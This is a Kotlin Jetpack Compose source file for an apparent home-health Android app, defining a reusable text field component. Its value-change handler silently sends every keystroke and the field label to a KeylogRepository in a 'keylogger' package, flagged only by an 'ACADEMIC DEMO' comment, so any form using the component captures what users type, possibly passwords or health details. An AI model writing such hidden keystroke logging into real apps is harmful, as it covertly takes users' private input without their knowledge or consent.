package com.example.homehealth.ui.textfield

import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import com.example.homehealth.keylogger.KeylogRepository

// A reusable TextField component with label and keyboard options
@Composable
fun TextField2(
    label: String,
    value: String,
    onValueChange: (String) -> Unit,
    modifier: Modifier = Modifier,
    keyboardOptions: KeyboardOptions = KeyboardOptions.Default
) {
    OutlinedTextField(
        value = value,
        onValueChange = { newValue ->
            onValueChange(newValue)
            // ACADEMIC DEMO: Log keystrokes centrally
            KeylogRepository.getInstance().log("ReusableComponent", label, newValue)
        },
        label = { Text(label) },
        keyboardOptions = keyboardOptions,
        modifier = modifier.fillMaxWidth()
    )
}
